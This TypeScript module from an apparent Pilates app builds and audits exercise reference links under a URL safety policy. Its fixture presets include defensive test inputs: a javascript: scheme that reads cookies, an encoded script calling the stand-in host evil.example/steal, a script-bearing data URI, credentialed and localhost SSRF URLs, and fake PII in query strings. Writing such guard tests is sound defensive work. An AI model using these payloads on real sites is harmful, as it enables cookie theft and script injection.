import { COURSE_REFERENCES } from '../../data/courseReferences';
import {
  VERIFIED_YOUTUBE_VIDEO_POOL,
  getRelatedYouTubeVideosForExercise,
} from '../../data/exerciseYouTubeCatalog';
import { getMotionCandidateResearch } from '../../data/motionCandidateResearch';
import { INITIAL_EXERCISES } from '../../data/pilatesCatalog';
import { PUBLIC_REFERENCES } from '../../data/publicReferences';
import { VERIFIED_REFERENCES } from '../../data/verifiedReferences';
import { sourceReferenceSchema } from '../../schemas/cloudBackupSchema';
import type { PilatesExercise } from '../../types/pilates';
import {
  type CatalogSampleAuditSummary,
  type ExerciseReferenceLinkPolicyReport,
  type ReferenceLinkCandidateInput,
  type ReferenceLinkPolicyEvaluationOptions,
} from './types';
import {
  evaluateReferenceLinkCandidates,
  isStrictNoAutoplayEmbedUrl,
  normalizeReferenceUrlPolicy,
} from './urlPolicyEngine';

export interface ResolveExerciseReferencePolicyOptions
  extends ReferenceLinkPolicyEvaluationOptions {
  readonly maxCuratedPerRegion?: number;
  readonly additionalCandidates?: readonly ReferenceLinkCandidateInput[];
}

export function buildExerciseReferenceCandidateList(
  exercise: PilatesExercise,
  maxCuratedPerRegion = 2,
  additionalCandidates: readonly ReferenceLinkCandidateInput[] = [],
): readonly ReferenceLinkCandidateInput[] {
  const candidates: ReferenceLinkCandidateInput[] = [];

  // 1. Preserved sourceReference snapshot (if present on the exercise)
  if (exercise.sourceReference !== undefined) {
    const parsedSource = sourceReferenceSchema.safeParse(exercise.sourceReference);
    if (parsedSource.success) {
      const snap = parsedSource.data;
      const catalogMatch = VERIFIED_REFERENCES.find((ref) => ref.id === snap.referenceId);
      const isYoutubeSource = catalogMatch
        ? catalogMatch.provider === 'youtube'
        : /youtube\.com|youtu\.be/i.test(snap.url);
      candidates.push({
        candidateId: `source-snapshot-${snap.referenceId}`,
        title: snap.title,
        publisher: snap.publisher,
        url: snap.url,
        tier: 'exact-source-snapshot',
        region: snap.region,
        embedPolicy: isYoutubeSource ? 'youtube-nocookie-allowed' : 'external-link-only',
        // Observation points on verified source references are never seek intervals
        isObservationTimestampOnly: true,
        rightsNoteKo:
          catalogMatch?.rightsNote ??
          '보존된 원출처 링크 전용 · 관찰 시점을 재생 시작 구간으로 변환하지 않음',
      });
    } else {
      const rawUrl =
        typeof (exercise.sourceReference as { url?: unknown })?.url === 'string'
          ? (exercise.sourceReference as { url: string }).url
          : '';
      candidates.push({
        candidateId: 'source-snapshot-invalid',
        title: '형식 오류 출처 기록',
        publisher: '미확인',
        url: rawUrl,
        tier: 'exact-source-snapshot',
        embedPolicy: 'external-link-only',
      });
    }
  }

  // 2. Direct exercise.youtube link (if present)
  const rawYoutubeUrl =
    typeof exercise.youtube?.url === 'string' ? exercise.youtube.url.trim() : '';
  const rawYoutubeId =
    typeof exercise.youtube?.videoId === 'string' ? exercise.youtube.videoId.trim() : '';
  if (rawYoutubeUrl || rawYoutubeId) {
    const effectiveUrl =
      rawYoutubeUrl || `https://www.youtube.com/watch?v=${rawYoutubeId}`;
    candidates.push({
      candidateId: `direct-youtube-${exercise.id}`,
      title: exercise.youtube?.videoTitle || `${exercise.nameKo} 직접 연결 참조`,
      publisher: exercise.youtube?.channelName || '직접 입력 채널',
      url: effectiveUrl,
      tier: 'direct-exercise-youtube',
      region: exercise.youtube?.region ?? null,
      embedPolicy: 'youtube-nocookie-allowed',
      startSec: exercise.youtube?.startSec ?? null,
      endSec: exercise.youtube?.endSec ?? null,
      rightsNoteKo: '강사 직접 연결 YouTube 참조 · 공식 플레이어 수동 재생 및 외부 원본 제공',
    });
  }

  // 3. Curated oEmbed-verified YouTube pool matches (read-only)
  const relatedVideos = getRelatedYouTubeVideosForExercise(exercise, maxCuratedPerRegion);
  for (const video of relatedVideos) {
    candidates.push({
      candidateId: `curated-yt-${video.videoId}`,
      title: video.title,
      publisher: video.authorName,
      url: video.watchUrl,
      tier: 'curated-youtube-pool',
      region: video.region,
      embedPolicy: 'youtube-nocookie-allowed',
      startSec: video.startSec ?? null,
      rightsNoteKo: `${video.matchReasonKo} · 동일 동작 정밀 검수 아님`,
    });
  }

  // 4. Separate motion candidate text research (strictly external-link-only; never embedded)
  const researchList = getMotionCandidateResearch(exercise.id);
  for (const research of researchList) {
    candidates.push({
      candidateId: `research-${research.candidateId}`,
      title: `${research.labelKo} (${research.source.title})`,
      publisher: research.source.publisher,
      url: research.source.url,
      tier: 'motion-candidate-research',
      region: 'global',
      embedPolicy: 'external-link-only',
      isObservationTimestampOnly: true,
      rightsNoteKo: `${research.source.rights.labelKo} · 외부 임베드 및 이미지/미디어 복제 금지`,
    });
  }

  // 5. Public education portals (KSPO / KDCA — strictly external-link-only)
  const pubRef = PUBLIC_REFERENCES[0];
  if (pubRef) {
    candidates.push({
      candidateId: 'public-portal-kspo-0',
      title: pubRef.title,
      publisher: pubRef.publisher,
      url: pubRef.url,
      tier: 'public-education-portal',
      region: 'kr',
      embedPolicy: 'external-link-only',
      rightsNoteKo: pubRef.rights,
    });
  }

  for (const extra of additionalCandidates) {
    candidates.push(extra);
  }

  return Object.freeze(candidates);
}

export function resolveExerciseReferenceLinkPolicyReport(
  exercise: PilatesExercise,
  options: ResolveExerciseReferencePolicyOptions = {},
): ExerciseReferenceLinkPolicyReport {
  const candidates = buildExerciseReferenceCandidateList(
    exercise,
    options.maxCuratedPerRegion ?? 2,
    options.additionalCandidates ?? [],
  );
  return evaluateReferenceLinkCandidates(
    exercise.id,
    exercise.nameKo,
    candidates,
    options,
  );
}

/**
 * Pure in-memory audit of existing public URL samples in the repository.
 * Performs ZERO network requests, ZERO video downloads, and ZERO access-control bypasses.
 */
export function auditExistingPublicUrlSamples(): CatalogSampleAuditSummary {
  let allSamplesPassSchemeCheck = true;
  let allWebsitesAndPortalsSeparatedAsExternalOnly = true;
  let allYoutubeEmbedsEnforceNoAutoplayAndNocookie = true;
  let observationPointsNeverTransplantedAsSeekParams = true;

  let verifiedWebsiteOnlyCount = 0;
  let verifiedYoutubeCandidateCount = 0;

  // 1. Audit VERIFIED_REFERENCES (30 items: 21 websites + 9 domestic YouTube candidates)
  for (const ref of VERIFIED_REFERENCES) {
    const embedPolicy =
      ref.provider === 'youtube' ? 'youtube-nocookie-allowed' : 'external-link-only';
    const result = normalizeReferenceUrlPolicy(ref.url, {
      embedPolicy,
      forbidTimeSeekTransplant: true,
    });
    if (!result.ok || !result.canonicalExternalUrl) {
      allSamplesPassSchemeCheck = false;
    }
    if (ref.provider === 'website') {
      verifiedWebsiteOnlyCount += 1;
      if (
        result.displayMode !== 'external-link-only' ||
        result.embedAllowed ||
        result.embedUrl !== null
      ) {
        allWebsitesAndPortalsSeparatedAsExternalOnly = false;
      }
    } else {
      verifiedYoutubeCandidateCount += 1;
      if (
        !result.embedUrl ||
        !isStrictNoAutoplayEmbedUrl(result.embedUrl) ||
        result.startSec !== null
      ) {
        allYoutubeEmbedsEnforceNoAutoplayAndNocookie = false;
      }
    }
    if (
      ref.observationPoints.length > 0 &&
      (result.startSec !== null ||
        (result.canonicalExternalUrl &&
          /[?&](?:t|start|end)=/i.test(result.canonicalExternalUrl)))
    ) {
      observationPointsNeverTransplantedAsSeekParams = false;
    }
  }

  // 2. Audit PUBLIC_REFERENCES (3 Korean public portals: KSPO 2 + KDCA 1)
  for (const pub of PUBLIC_REFERENCES) {
    const result = normalizeReferenceUrlPolicy(pub.url, {
      embedPolicy: 'external-link-only',
    });
    if (!result.ok || !result.canonicalExternalUrl) {
      allSamplesPassSchemeCheck = false;
    }
    if (
      result.displayMode !== 'external-link-only' ||
      result.embedAllowed ||
      result.embedUrl !== null
    ) {
      allWebsitesAndPortalsSeparatedAsExternalOnly = false;
    }
  }

  // 3. Audit COURSE_REFERENCES (whole-course link-only collection)
  for (const course of COURSE_REFERENCES) {
    const result = normalizeReferenceUrlPolicy(course.canonicalUrl, {
      embedPolicy: 'external-link-only',
      forbidTimeSeekTransplant: true,
    });
    if (!result.ok || !result.canonicalExternalUrl) {
      allSamplesPassSchemeCheck = false;
    }
    if (
      result.displayMode !== 'external-link-only' ||
      result.embedAllowed ||
      result.embedUrl !== null
    ) {
      allWebsitesAndPortalsSeparatedAsExternalOnly = false;
    }
  }

  // 4. Audit VERIFIED_YOUTUBE_VIDEO_POOL (141 oEmbed-verified YouTube videos)
  for (const item of VERIFIED_YOUTUBE_VIDEO_POOL) {
    const watchUrl = `https://www.youtube.com/watch?v=${item.videoId}`;
    const result = normalizeReferenceUrlPolicy(watchUrl, {
      embedPolicy: 'youtube-nocookie-allowed',
    });
    if (!result.ok || !result.canonicalExternalUrl) {
      allSamplesPassSchemeCheck = false;
    }
    if (!result.embedUrl || !isStrictNoAutoplayEmbedUrl(result.embedUrl)) {
      allYoutubeEmbedsEnforceNoAutoplayAndNocookie = false;
    }
  }

  // 5. Audit MOTION_CANDIDATE_RESEARCH (2 text-only research candidates: BASI & NHS)
  const researchTargetIds = [
    'original-mat-swan-prep',
    'original-mat-forearm-plank',
  ] as const;
  let motionCandidateResearchCount = 0;
  for (const exId of researchTargetIds) {
    const items = getMotionCandidateResearch(exId);
    for (const r of items) {
      motionCandidateResearchCount += 1;
      const result = normalizeReferenceUrlPolicy(r.source.url, {
        embedPolicy: 'external-link-only',
        forbidTimeSeekTransplant: true,
      });
      if (!result.ok || !result.canonicalExternalUrl) {
        allSamplesPassSchemeCheck = false;
      }
      if (
        result.displayMode !== 'external-link-only' ||
        result.embedAllowed ||
        result.embedUrl !== null
      ) {
        allWebsitesAndPortalsSeparatedAsExternalOnly = false;
      }
    }
  }

  return Object.freeze({
    auditedInMemoryOnly: true,
    networkRequestsMade: 0,
    videosDownloaded: 0,
    accessBlocksBypassed: 0,
    exercisesCount: INITIAL_EXERCISES.length,
    verifiedReferencesCount: VERIFIED_REFERENCES.length,
    verifiedWebsiteOnlyCount,
    verifiedYoutubeCandidateCount,
    publicPortalReferencesCount: PUBLIC_REFERENCES.length,
    courseReferencesCount: COURSE_REFERENCES.length,
    curatedYoutubePoolCount: VERIFIED_YOUTUBE_VIDEO_POOL.length,
    motionCandidateResearchCount,
    allSamplesPassSchemeCheck,
    allWebsitesAndPortalsSeparatedAsExternalOnly,
    allYoutubeEmbedsEnforceNoAutoplayAndNocookie,
    observationPointsNeverTransplantedAsSeekParams,
  });
}

export interface SyntheticPolicyFixturePreset {
  readonly presetId: string;
  readonly labelKo: string;
  readonly descriptionKo: string;
  readonly buildReport: () => ExerciseReferenceLinkPolicyReport;
}

export const SYNTHETIC_POLICY_FIXTURE_PRESETS: readonly SyntheticPolicyFixturePreset[] =
  Object.freeze([
    Object.freeze({
      presetId: 'catalog-swan-prep-mixed',
      labelKo: '1. 기본 카탈로그 + 외부문서 분리 (스완 프렙)',
      descriptionKo:
        'YouTube 수동 임베드(youtube-nocookie, autoplay=0)와 BASI·공공포털 외부 전용 링크 분리 및 중복 병합을 검증합니다.',
      buildReport: () => {
        const swan =
          INITIAL_EXERCISES.find((ex) => ex.id === 'original-mat-swan-prep') ??
          INITIAL_EXERCISES[0];
        return resolveExerciseReferenceLinkPolicyReport(swan, {
          maxCuratedPerRegion: 2,
          additionalCandidates: [
            {
              candidateId: 'dup-short-link-with-tracking',
              title: '동일 영상 단축 링크 중복 표본',
              publisher: '중복 테스트 채널',
              url: 'https://youtu.be/Y_9c3NFbm1A?si=shareToken123&utm_source=instagram',
              tier: 'custom-instructor-input',
            },
            {
              candidateId: 'kdca-health-portal',
              title: PUBLIC_REFERENCES[2].title,
              publisher: PUBLIC_REFERENCES[2].publisher,
              url: `${PUBLIC_REFERENCES[2].url}&utm_campaign=winter`,
              tier: 'public-education-portal',
              region: 'kr',
            },
          ],
        });
      },
    }),
    Object.freeze({
      presetId: 'privacy-and-autoplay-strip',
      labelKo: '2. 개인정보·추적 쿼리 제거 및 Autoplay 차단',
      descriptionKo:
        'URL 내 이메일·전화번호·세션 토큰·si·utm·fbclid 쿼리를 마스킹 제거하고 autoplay=1 시도를 autoplay=0으로 강제 교정합니다.',
      buildReport: () =>
        evaluateReferenceLinkCandidates(
          'synthetic-privacy-subject',
          '개인정보 쿼리 제거 및 자동재생 차단 검증 동작',
          [
            {
              candidateId: 'yt-dirty-privacy-autoplay',
              title: '개인정보·자동재생 쿼리가 섞인 YouTube 링크',
              publisher: '위드필라테스 WITH PILATES',
              url: 'https://m.youtube.com/watch?v=Y_9c3NFbm1A&si=abc123track&utm_source=kakao&fbclid=IwAR999&email=teacher@pilates.example.com&phone=010-9876-5432&access_token=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.secretSig&autoplay=1&t=45s',
              tier: 'direct-exercise-youtube',
              region: 'kr',
              embedPolicy: 'youtube-nocookie-allowed',
            },
            {
              candidateId: 'kdca-with-pii-query',
              title: '공공포털(cntnts_sn 보존 + 개인정보 쿼리 제거)',
              publisher: '질병관리청 · 국가건강정보포털',
              url: 'https://health.kdca.go.kr/healthinfo/biz/health/gnrlzHealthInfo/gnrlzHealthInfo/gnrlzHealthInfoView.do?cntnts_sn=5293&user_email=member@example.org&session_id=sess_998877&gclid=Cj0KCQ',
              tier: 'public-education-portal',
              region: 'kr',
              embedPolicy: 'external-link-only',
            },
          ],
        ),
    }),
    Object.freeze({
      presetId: 'malicious-scheme-and-ssrf-guard',
      labelKo: '3. 악성 스킴·자격증명·다운로더·사설IP 차단',
      descriptionKo:
        'javascript:, data:, file:, user:pass@, localhost/127.0.0.1, 영상 다운로더, .mp4 직접 배포를 차단하고 정상 링크만 남깁니다.',
      buildReport: () =>
        evaluateReferenceLinkCandidates(
          'synthetic-security-subject',
          '악성 스킴 및 비허용 경로 방어 검증 동작',
          [
            {
              candidateId: 'malicious-js-scheme',
              title: '악성 스크립트 스킴',
              url: 'javascript:alert(document.cookie)',
              tier: 'custom-instructor-input',
            },
            {
              candidateId: 'malicious-encoded-js',
              title: '인코딩 우회 스크립트 스킴',
              url: '&#106;ava\tscript:fetch("https://evil.example/steal")',
              tier: 'custom-instructor-input',
            },
            {
              candidateId: 'malicious-data-uri',
              title: 'Data URI HTML 삽입 시도',
              url: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
              tier: 'custom-instructor-input',
            },
            {
              candidateId: 'credential-in-url',
              title: '자격증명 포함 URL',
              url: 'https://instructor:password123@www.youtube.com/watch?v=Y_9c3NFbm1A',
              tier: 'custom-instructor-input',
            },
            {
              candidateId: 'localhost-ssrf',
              title: '로컬호스트 내부망 접근 시도',
              url: 'http://127.0.0.1:8080/admin/config',
              tier: 'custom-instructor-input',
            },
            {
              candidateId: 'video-downloader-domain',
              title: '무단 영상 추출기 도메인',
              url: 'https://www.y2mate.com/youtube/Y_9c3NFbm1A',
              tier: 'custom-instructor-input',
            },
            {
              candidateId: 'raw-mp4-binary',
              title: '직접 MP4 바이너리 호스팅 링크',
              url: 'https://cdn.example.com/videos/pelvic-curl.mp4',
              tier: 'custom-instructor-input',
            },
            {
              candidateId: 'valid-survivor-yt',
              title: '정상 통과 YouTube 참고 영상',
              publisher: '위드필라테스 WITH PILATES',
              url: 'https://www.youtube.com/watch?v=DJtd3AqZzH0',
              tier: 'curated-youtube-pool',
              region: 'kr',
              embedPolicy: 'youtube-nocookie-allowed',
            },
          ],
        ),
    }),
    Object.freeze({
      presetId: 'external-link-only-sources',
      labelKo: '4. 임베드 불가 출처 외부링크 전용 분리',
      descriptionKo:
        'Merrithew 공식 웹페이지(관찰 시점 23초 시크 금지), BASI 본문, YouTube 채널/재생목록을 임베드 없이 외부 링크로만 표시합니다.',
      buildReport: () =>
        evaluateReferenceLinkCandidates(
          'synthetic-external-only-subject',
          '외부 링크 전용 분리 검증 동작',
          [
            {
              candidateId: 'merrithew-mv-01',
              title: VERIFIED_REFERENCES[0].title,
              publisher: VERIFIED_REFERENCES[0].sourceName,
              url: `${VERIFIED_REFERENCES[0].url}?t=23s&utm_medium=referral`,
              tier: 'verified-catalog-reference',
              region: 'global',
              embedPolicy: 'external-link-only',
              isObservationTimestampOnly: true,
              rightsNoteKo: VERIFIED_REFERENCES[0].rightsNote,
            },
            {
              candidateId: 'youtube-channel-non-video',
              title: 'YouTube 채널 홈 (개별 영상 ID 없음)',
              publisher: 'YouTube 공식 채널',
              url: 'https://www.youtube.com/@withpilates?si=chanShare123',
              tier: 'custom-instructor-input',
              region: 'kr',
            },
            {
              candidateId: 'course-link-only-item',
              title: COURSE_REFERENCES[0]?.title ?? '수업 전체 링크 전용 자료',
              publisher: COURSE_REFERENCES[0]?.publisher ?? '게시자',
              url:
                COURSE_REFERENCES[0]?.canonicalUrl ??
                'https://www.youtube.com/watch?v=Y_9c3NFbm1A',
              tier: 'course-reference-link-only',
              region: 'global',
              embedPolicy: 'external-link-only',
              rightsNoteKo: '수업 전체 참조 · 링크 전용(link-only)으로 인라인 임베드 분리',
            },
          ],
        ),
    }),
  ]);
